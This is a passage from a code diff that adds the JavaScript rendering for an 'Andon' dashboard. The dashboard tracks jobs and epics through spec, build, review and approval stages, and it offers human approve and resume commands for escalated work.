+      const lands = ep ? `Merged into ${j.target} · lands on ${ep.target} with the epic` : '';
+      const mark = ie ? `<span class="iem" title="${esc(lands)}" aria-label="${esc(lands)}" role="img">${ICON.merge}</span>` : '';
+      return `<button class="tok k-${k}${ie ? ' ie' : ''}${sel}" data-key="${esc(j.key)}" type="button"><span class="l1"><span class="num">${num(j)}</span><span class="sl">${esc(sliver(j))}</span>${mark}<span class="age">${since(j.enteredAt, 'unit')}</span></span></button>`;
+    }
+    if (k === 'needs-human') {
+      const mf = isMF(j), why = j.note.replace(/^(approver|merge failed|review budget spent): ?/, '');
+      return `<button class="tok k-needs-human${mf ? ' mf' : ''}${sel}" data-key="${esc(j.key)}" type="button">${head}
+        <span class="l2"><span class="tag">${mf ? ICON.merge + 'Merge failed' : ICON.flag + 'Escalated'}</span><span class="age">${since(j.enteredAt)}</span><span class="why">${esc(why)}</span></span>${l3}</button>`;
+    }
+    let l2;
+    if (k === 'reviewing' || k === 'review-failed') l2 = `${k === 'review-failed' ? '<span class="tag">Changes</span>' : ''}${verdicts(j)}${roundTag(j)}<span class="age">${since(j.enteredAt)}</span>`;
+    else if (k === 'approve') l2 = `${verdicts(j)}${roundTag(j)}<span class="age">${since(j.enteredAt)}</span>`;
+    else if (k === 'build') { const p = curRound(j); const rw = p && Object.values(p.reviews).some((v) => v.verdict === 'CHANGES'); l2 = `<span class="tag">${rw ? `Rework → R${j.round + 1}` : 'Building'}</span><span class="age">${since(j.enteredAt)}</span>`; }
+    else if (k === 'claimed') l2 = `<span class="tag">Claimed</span><span class="age">${since(j.enteredAt)}</span>`;
+    else l2 = `<span class="tag">Drafting spec</span><span class="age">${since(j.enteredAt)}</span>`;
+    const note = j.note && k !== 'merged' && k !== 'settled' ? `<span class="l3">${esc(j.note)}</span>` : l3;
+    return `<button class="tok k-${k}${ie ? ' ie' : ''}${sel}" data-key="${esc(j.key)}" type="button">${head}<span class="l2">${htag}${l2}</span>${note}${k === 'approve' ? `<span class="seal">${ICON.seal}</span>` : ''}${k === 'build' ? '<span class="prog"></span>' : ''}</button>`;
+  };
+  const haltedAt = (j) => { const h = j.history, prev = h[h.length - 2]; return prev ? colOf({ kind: prev.stage === 'review' ? 'reviewing' : prev.stage }) : null; };
+  const matches = (j) => { const q = S.query.trim().toLowerCase(); const e = epicOf(j); return !q || j.id.includes(q) || j.title.toLowerCase().includes(q) || P[j.project].name.includes(q) || (e && e.title.toLowerCase().includes(q)); };
+
+  const cells = (jobs, focus) => COLS.map((c) => {
+    const here = jobs.filter((j) => colOf(j) === c.key && (focus || j.kind !== 'settled')).sort((a, b) => (a.kind === 'settled') - (b.kind === 'settled') || b.enteredAt - a.enteredAt);
+    let inner = here.filter((j) => !S.needsMe || needsMe(j)).map(token).join('');
+    for (const j of jobs) if (j.kind === 'needs-human' && haltedAt(j) === c.key) inner += `<button class="ghost" data-key="${esc(j.key)}" type="button"><span class="num">${num(j)}</span>${isMF(j) ? 'merge broke here' : 'stopped here'} → Andon</button>`;
+    return `<div>${inner || '<span class="empty">—</span>'}</div>`;
+  }).join('');
+
+  // ── epic gutter: name + dot; progress; what's waiting ──
+  const epicJobs = (e) => F.jobs.filter((j) => j.project === e.project && j.epic === e.slug);
+  const epicLine2 = (e) => [`${e.merged}/${e.members.length} merged`, e.running ? `${e.running} running` : '', since(e.startedAt)].filter(Boolean).map((x) => `<span class="nw">${x}</span>`).join(' · ');
+  const epicLine3 = (e) => {
+    if (e.state === 'waiting') return `<span class="meta wrap"><span class="hot">Waiting on you: ${esc(e.blocked.reason)}</span></span>`;
+    if (e.state === 'landing') return '<span class="meta"><span class="landing">Landing…</span></span>';
+    const parts = [];
+    const on = {}; for (const m of e.blockedMembers) on[m.blockedOn] = (on[m.blockedOn] || 0) + 1;
+    for (const [k, n] of Object.entries(on)) parts.push(`${n} blocked on ${esc(k.split('/')[1].slice(0, 3))}`);
+    if (e.queued) parts.push(`${e.queued} queued`);
+    return parts.length ? `<span class="meta wrap">${parts.map((x) => `<span class="nw">${x}</span>`).join(' · ')}</span>` : '';
+  };
+  const epicGutter = (e) => `<div class="gut egut"><button class="en${S.epic === e.key ? ' sel' : ''}" data-epic="${esc(e.key)}" type="button" title="Open epic ${esc(e.title)} · ${ESTATE[e.state]}"><span class="edot ${EDOT[e.state]}"></span><span class="ename">${esc(e.title)}</span></button>
+    <span class="meta wrap" title="merged into the epic branch · running · since the epic started">${epicLine2(e)}</span>${epicLine3(e)}</div>`;
+
+  // ── the board ────────────────────────────────
+  function boardHTML({ only = null, focus = false } = {}) {
+    const L = lanes();
+    const show = only ? L.filter((l) => only.includes(l.p.id)) : focus ? L.filter((l) => l.p.id === S.project) : L;
+    const inScope = (j) => (focus ? j.project === S.project : only ? only.includes(j.project) : true);
+    const perCol = Object.fromEntries(COLS.map((c) => [c.key, F.jobs.filter((j) => inScope(j) && colOf(j) === c.key && j.kind !== 'settled').length]));
+    const epicHotHere = F.epics.filter((e) => inScope({ project: e.project })).reduce((n, e) => n + epicHot(e), 0);
+    perCol.andon += epicHotHere;
+    let h = `<div class="row head"><div class="corner">${focus ? '1 project' : only ? `${show.length} projects` : `${show.filter((l) => !l.idle).length} active · ${show.filter((l) => l.idle).length} idle`}</div>`;
+    h += COLS.map((c) => `<div class="${c.key === 'andon' ? 'andon' : ''}" style="--kc:${c.kc}"${c.key === 'andon' && epicHotHere ? ` title="${perCol.andon - epicHotHere} jobs and ${epicHotHere} epic need a human"` : ''}><span class="h">${c.key === 'andon' ? ICON.flag : '<i></i>'}${c.name} <span class="badge${c.key === 'andon' && perCol[c.key] ? ' red' : ''}">${perCol[c.key]}</span></span><span class="w">${c.who}</span></div>`).join('') + '</div>';
+    for (const l of show) {
+      const anyMe = l.every.some(needsMe) || l.epics.some((e) => epicHot(e));
+      const anyMatch = l.jobs.some(matches) || l.epics.some((e) => !S.query || e.title.toLowerCase().includes(S.query.trim().toLowerCase()) || epicJobs(e).some(matches));
+      const cls = (S.needsMe && !anyMe ? ' hidden' : '') + (S.query && !anyMatch ? ' dimmed' : '');
+      if (l.idle && !focus) {
+        h += `<div class="row idle${cls}"><div class="gut"><button class="pn" data-proj="${l.p.id}" type="button"><span class="dot"></span><span class="pname">${esc(l.p.name)}</span></button></div>
+          <div class="span"><span>Idle · last merge ${since(l.lastMerge, 'short', ' ago')}</span><button class="settled-pill" data-settled="${l.p.id}" type="button">Settled <b>${l.settled.length}</b></button></div></div>`;
+        continue;
+      }
+      const subs = l.epics.filter((e) => !S.needsMe || epicHot(e) || epicJobs(e).some(needsMe));
+      const meta = [`${l.active.length} active`]; if (l.oldest !== null) meta.push(since(l.oldest));
+      const third = (() => { const sl = l.settled.length && !S.needsMe ? `<button class="slink" data-settled="${l.p.id}" type="button">${l.settled.length} settled</button>` : ''; const st = l.hot ? `<span class="hot">${l.hot} at Andon</span>` : l.failed ? `<span style="color:var(--orange)">${l.failed} sent back</span>` : ''; return st || sl ? `<span class="meta">${[st, sl].filter(Boolean).join(' · ')}</span>` : ''; })();
+      h += `<div class="row${subs.length ? ' has-sub' : ''}${cls}"><div class="gut"><button class="pn" data-proj="${l.p.id}" type="button" title="Focus ${esc(l.p.name)}"><span class="dot ${l.dot}"></span><span class="pname">${esc(l.p.name)}</span></button>
+        <span class="meta" title="active jobs · oldest claim">${meta.join(' · ')}</span>${third}</div>${cells(l.jobs, focus)}</div>`;
+      subs.forEach((e, i) => {
+        const ej = epicJobs(e);
+        const dim = S.query && !(e.title.toLowerCase().includes(S.query.trim().toLowerCase()) || ej.some(matches)) ? ' dimmed' : '';
+        h += `<div class="row sub${i === subs.length - 1 ? ' last' : ''}${e.state === 'waiting' ? ' hotgut' : ''}${cls.includes('hidden') ? ' hidden' : ''}${dim}" data-epic-row="${esc(e.key)}">${epicGutter(e)}${cells(ej, focus)}</div>`;
+      });
+    }
+    return h;
+  }
+
+  // ── inspector: job ───────────────────────────
+  const docsOf = (j) => F.docsFor(j);
+  const defaultFile = (j) => { const f = docsOf(j).filter((x) => x.path !== 'feature.md'); return f.length ? f[f.length - 1].path : 'feature.md'; };
+  const fileGroups = (j) => {
+    const g = [{ name: 'Job', files: [{ path: 'timing', label: 'timing', verdict: null, icon: ICON.clock }] }];
+    for (const f of docsOf(j)) {
+      const m = f.path.match(/^round-(\d+)\//);
+      const name = m ? `Round ${m[1]}` : 'Job';
+      let grp = g.find((x) => x.name === name); if (!grp) { grp = { name, files: [] }; g.push(grp); }
+      grp.files.push({ path: f.path, label: m ? f.path.split('/').pop().replace('review-', '').replace('.md', '') + ' review' : f.path, verdict: f.verdict, icon: ICON.doc });
+    }
+    const job = g[0]; const ord = ['timing', 'feature.md', 'spec.md', 'build.md', 'decision.md']; job.files.sort((a, b) => ord.indexOf(a.path) - ord.indexOf(b.path));
+    return g;
+  };
+  const flatFiles = (j) => fileGroups(j).flatMap((g) => g.files.map((f) => f.path));
+  const roundAt = (j, t) => j.rounds.filter((r) => r.at <= t).length;
+
+  function timingHTML(j) {
+    const st = F.stagesFor(j);
+    const merged = j.history.find((h) => h.stage === 'merged');
+    const end = merged ? merged.at : null;
+    const total = (end ?? now()) - j.claimedAt;
+    const live = (s, i) => i === st.length - 1 && j.stage !== 'merged';
+    const bar = st.filter((s) => s.stage !== 'merged').map((s, i) => `<span class="s-${s.stage}" style="flex-grow:${Math.max(1, (live(s, i) ? now() - s.entered : s.duration) / 60000)}" title="${s.stage} ${short(live(s, i) ? now() - s.entered : s.duration)}"></span>`).join('');
+    const seen = [...new Set(st.map((s) => s.stage).filter((s) => s !== 'merged'))];
+    const agents = F.agentsFor(j);
+    return `<h1>Timing</h1>
+      <p class="tline">Claimed ${dayhm(j.claimedAt)} UTC · ${merged ? `merged ${dayhm(end)} UTC · took <b>${short(total)}</b>` : `running ${since(j.claimedAt, 'clock')}`}</p>
+      <div class="tbar" role="img" aria-label="Time per stage">${bar}</div>
+      <div class="tleg">${seen.map((s) => `<span><i class="s-${s}"></i>${s}</span>`).join('')}</div>
+      <h2>Stages</h2>
+      <table class="tt"><thead><tr><th>Stage</th><th>Round</th><th>Entered</th><th class="n">Duration</th></tr></thead><tbody>
+      ${st.map((s, i) => `<tr><td>${s.stage}</td><td>${(s.stage === 'build' ? roundAt(j, s.entered) + 1 : roundAt(j, s.entered)) || '—'}</td><td>${hhmm(s.entered)}</td><td class="n${live(s, i) ? ' run' : ''}">${s.stage === 'merged' ? '—' : live(s, i) ? since(s.entered, 'clock') : short(s.duration)}</td></tr>`).join('')}
+      </tbody></table>
+      <h2>Agents</h2>
+      <table class="tt"><thead><tr><th>Agent</th><th>Round</th><th>Result</th><th>Started</th><th class="n">Duration</th></tr></thead><tbody>
+      ${agents.map((a) => { const running = a.ended === null && j.stage !== 'needs-human'; return `<tr><td>${esc(a.who)}</td><td>${a.round ?? '—'}</td><td class="${a.verdict ? '' : 'na'}">${a.verdict ? `<span class="vd ${a.verdict}" style="display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:5px"></span>${a.verdict}` : running ? '<span class="run">running</span>' : '—'}</td><td>${hhmm(a.started)}</td><td class="n${running ? ' run' : ''}">${a.ended ? short(a.ended - a.started) : running ? since(a.started, 'clock') : '—'}</td></tr>`; }).join('')}
+      </tbody></table>`;
+  }
+
+  function jobInspectorHTML(j) {
+    const groups = fileGroups(j);
+    const file = S.file && flatFiles(j).includes(S.file) ? S.file : defaultFile(j);
+    S.file = file;
+    const doc = file === 'timing' ? timingHTML(j) : (() => { const f = docsOf(j).find((x) => x.path === file); return f ? F.md(f.text).replace('<p class="verdict-line">', `<p class="verdict-line ${f.verdict ?? ''}">`) : '<p>Nothing written yet.</p>'; })();
+    const r = curRound(j);
+    const ie = j.kind === 'merged' && j.epic;
+    const sum = j.kind === 'merged' || j.kind === 'settled'
+      ? `Merged${ie ? ' into the epic' : ''} ${since(j.enteredAt, 'short', ' ago')} · took <b>${short(j.enteredAt - j.claimedAt)}</b> · ${j.round} round${j.round === 1 ? '' : 's'}`
+      : `<b>${since(j.enteredAt, 'clock')}</b> in ${j.stage} · claimed ${since(j.claimedAt, 'short', ' ago')}${j.round ? ` · round ${j.round}/${j.maxRound}` : ''}`;
+    const human = j.kind === 'needs-human';
+    const ap = `/factory approve ${j.id}`;
+    const e = epicOf(j);
+    const elink = e ? `<button class="elink" data-epic="${esc(e.key)}" type="button">${ICON.epic}<span>${j.helper ? `Generated ${j.helper} job in epic` : 'Member of epic'}</span><b>${esc(e.title)}</b></button>` : '';
+    return `
+      <div class="ins-bar"><span class="lbl">${esc(P[j.project].name)} / ${esc(j.id)}</span>
+        <button class="copy" id="insClose" type="button" aria-label="Close inspector" title="Close (esc)">${ICON.close}</button></div>
+      <div class="ins-head">
+        <div class="crumbs"><span>${esc(P[j.project].name)}</span>·<span>${esc(j.id)}</span><span class="stage-chip ${j.kind}">${ie ? 'Merged in epic' : KIND[j.kind]}</span></div>
+        <h2 id="insTitle">${esc(j.title === j.id ? 'Untitled — spec pending' : j.title)}</h2>
+        <div class="branch" title="branch → target">${esc(F.landing(j))}</div>
+        <div class="tsum">${sum}</div>${elink}
+      </div>
+      ${human ? `<div class="callout"><div class="why">${isMF(j) ? ICON.merge : ICON.flag}<span>${esc(j.note)}</span></div>
+        <div class="acts"><button class="btn primary" id="approve" type="button">Approve</button><button class="btn" id="rework" type="button">Rework…</button></div>
+        <div class="cmd"><code>${esc(ap)}</code><button class="copy" data-copy="${esc(ap)}" type="button" aria-label="Copy command">${ICON.copy}</button></div></div>`
+      : j.kind === 'review-failed' ? `<div class="callout" style="background:rgba(255,159,10,.09);box-shadow:inset 0 0 0 .5px rgba(255,159,10,.45)"><div class="why" style="color:#ffc977;margin:0">${ICON.flag}<span>${esc(j.note)} — the builder goes again in round ${j.round + 1}.</span></div></div>` : ''}
+      <nav class="files" id="files" aria-label="Job files">${groups.map((g) => `<h5><span>${g.name}</span>${g.name.startsWith('Round') && r && g.name === `Round ${r.round}` && j.kind !== 'merged' && j.kind !== 'settled' ? '<span>current</span>' : ''}</h5>
+        ${g.files.map((f) => `<button class="file${f.path === file ? ' on' : ''}" data-file="${esc(f.path)}" type="button" aria-current="${f.path === file}">${f.icon}<span>${esc(f.label)}</span>${f.verdict ? `<span class="vd ${f.verdict}" title="${f.verdict}"></span>` : ''}</button>`).join('')}`).join('')}</nav>
+      <div class="doc" id="doc"><div class="md">${doc}</div></div>`;
+  }
+
+  // ── inspector: epic ──────────────────────────
+  const STATION = { claimed: 'Claimed', spec: 'Spec', build: 'Build', review: 'Review', approve: 'Approve' };
+  const KC = { spec: 'var(--teal)', claimed: 'var(--gray)', build: 'var(--indigo)', reviewing: 'var(--purple)', 'review-failed': 'var(--orange)', approve: 'var(--blue)' };
+  const memberState = (e, m, j) => {
+    if (m.state === 'merged') return `<span class="mst merged">${ICON.check}merged in epic</span>`;
+    if (m.state === 'needs-human') return `<span class="mst needs-human">${ICON.flag}needs you</span>`;
+    if (m.state === 'blocked') return `<span class="mst blocked" title="${esc(m.blockedOn)} escalated">blocked on ${esc(m.blockedOn.split('/')[1].slice(0, 3))}</span>`;
+    if (m.state === 'queued') return `<span class="mst queued" title="waiting for its after: edges">queued</span>`;
+    const rd = j.kind === 'build' && j.rounds.length ? ` R${j.round + 1}` : j.round ? ` R${j.round}` : '';
+    return `<span class="mst running" style="--kc:${KC[j.kind]}"><i></i>running · ${STATION[j.stage]}${rd}${j.kind === 'review-failed' ? ' · changes' : ''}</span>`;
+  };
+  const jid = (key) => (key ? `<button class="jid" data-key="${esc(key)}" type="button" title="Open ${esc(key.split('/')[1])}">${esc(key.split('/')[1].slice(0, 3))}</button>` : '<span class="jid none"></span>');
+  function epicInspectorHTML(e, { closeBtn = true, docs = true, members = true } = {}) {
+    const K = byKey();
+    const files = F.epicDocs(e);
+    const file = S.file && files.some((f) => f.path === S.file) ? S.file : files[0].path;
+    if (docs) S.file = file;
+    const segs = [...e.members.map((m) => { const j = m.jobKey ? K[m.jobKey] : null; return { cls: j && m.state === 'running' ? `k-${j.kind}` : m.state, t: `${m.slug}: ${m.state}` }; }),
+      ...e.helpers.map((k) => ({ cls: `k-${K[k].kind}`, t: `${K[k].id}: ${K[k].kind}` }))];
+    const rows = e.members.map((m, i) => {
+      const j = m.jobKey ? K[m.jobKey] : null;
+      return `<div class="mem"><span class="mi">${i + 1}</span><div class="mt" title="${esc(m.title)}">${esc(m.title)}</div><div class="mr">${memberState(e, m, j)}</div>
+        <span></span><div class="ms"><b>${esc(m.slug)}</b>${m.after.length ? ` · after: ${m.after.map(esc).join(', ')}` : ' · after: none'}</div><div class="mr">${jid(m.jobKey)}</div></div>`;
+    }).join('');
+    const helpers = e.helpers.map((k) => { const j = K[k]; return `<div class="mem"><span class="mi"></span><div class="mt"><span class="htag" style="margin-right:6px">${j.helper}</span>${esc(j.title)}</div><div class="mr">${memberState(e, { state: j.kind === 'merged' ? 'merged' : j.kind === 'needs-human' ? 'needs-human' : 'running' }, j)}</div>
+        <span></span><div class="ms" title="${esc(j.note)}">${esc(j.note || j.branch)}</div><div class="mr">${jid(k)}</div></div>`; }).join('');
+    const resume = `/factory epic resume ${e.slug}`;
+    let callout = '';
+    if (e.state === 'waiting') callout = `<div class="callout"><div class="why">${ICON.flag}<span><b>Waiting on you: <span style="white-space:nowrap">${esc(e.blocked.reason)}.</span></b> ${esc(e.blocked.note.replace(/^Landing blocked: [^.]*\. ?/, ''))}</span></div>
+        <div class="sub">Landing stopped ${since(e.blocked.at, 'short', ' ago')}. Fix the checkout, then resume the epic.</div>
+        <div class="acts"><button class="btn primary" data-copy="${esc(resume)}" type="button">Resume</button></div>
+        <div class="cmd"><code>${esc(resume)}</code><button class="copy" data-copy="${esc(resume)}" type="button" aria-label="Copy command">${ICON.copy}</button></div></div>`;
+    else if (e.state === 'stalled') {
+      const j = F.jobs.find((x) => x.project === e.project && x.epic === e.slug && x.kind === 'needs-human');
+      callout = `<div class="callout"><div class="why">${ICON.flag}<span><b>${esc(num(j))} ${esc(j.title)} needs you.</b> ${esc(j.note)}</span></div>
+        <div class="sub">Nothing else in this epic can run until it's resolved: ${e.blockedMembers.length} blocked, ${e.queued} queued.</div>
+        <div class="acts"><button class="btn primary" data-key="${esc(j.key)}" type="button">Open ${esc(num(j))}</button></div></div>`;
+    }
+    const doc = files.find((f) => f.path === file);
+    const groups = ['Plan', 'Member briefs'];
+    const dur = e.state === 'landed' ? '' : `<b>${since(e.startedAt)}</b> running · `;
+    return `
+      <div class="ins-bar"><span class="lbl">${esc(P[e.project].name)} / epic / ${esc(e.slug)}</span>
+        ${closeBtn ? `<button class="copy" id="insClose" type="button" aria-label="Close inspector" title="Close (esc)">${ICON.close}</button>` : ''}</div>
+      <div class="ins-scroll">
+      <div class="ins-head">
+        <div class="crumbs"><span>${esc(P[e.project].name)}</span>·<span class="stage-chip epic">Epic</span><span class="stage-chip e-${e.state}">${ESTATE[e.state]}</span></div>
+        <h2 id="insTitle">${esc(e.title)}</h2>
+        <div class="branch" title="epic branch → target">${esc(e.branch)} → ${esc(e.target)}</div>
+        <div class="tsum">${dur}started ${dayhm(e.startedAt)} UTC · ${e.merged}/${e.members.length} merged</div>
+        <div class="eprog" role="img" aria-label="Members by state">${segs.map((s) => `<i class="${s.cls}" title="${esc(s.t)}"></i>`).join('')}</div>
+      </div>
+      ${callout}
+      ${members ? `<section class="members" aria-label="Members"><h5><span>Members</span><span>plan order</span></h5>${rows}${helpers ? `<h5 style="margin-top:8px"><span>Generated</span><span>sync · fix</span></h5>${helpers}` : ''}</section>` : ''}
+      ${docs ? `<nav class="files" id="files" aria-label="Epic documents">${groups.map((g) => `<h5><span>${g}</span>${g === 'Plan' ? '<span>factory/epics/</span>' : ''}</h5>
+        ${files.filter((f) => f.group === g).map((f) => `<button class="file${f.path === file ? ' on' : ''}" data-file="${esc(f.path)}" type="button" aria-current="${f.path === file}" title="${esc(f.path)}">${g === 'Plan' ? ICON.plan : ICON.doc}<span>${esc(f.label)}</span></button>`).join('')}`).join('')}</nav>
+      <div class="doc" id="doc"><div class="md">${F.md(doc.text)}</div></div>` : ''}
+      </div>`;
+  }
+
+  return { fmtOf, unit, esc, now, ABBR, ICON, COLS, P, E, KIND, byKey, epicOf, isMF, num, curRound, short, clock, since, hhmm, dayhm, order, lanes, token, matches, needsMe, hotTotal, needsMeTotal,
+    boardHTML, jobInspectorHTML, epicInspectorHTML, fileGroups, flatFiles, epicDocs: F.epicDocs };
+};
+
+</script>
+<script>
+(function () {
+  const S = { job: null, epic: null, file: null, project: null, needsMe: false, query: '' };
+  const A = makeAndon(window.FACTORY, S);
+  document.getElementById('board').innerHTML = A.boardHTML({ only: ['factory', 'minerva', 'aegis'] });
+})();
+</script>
+</body>
+</html>
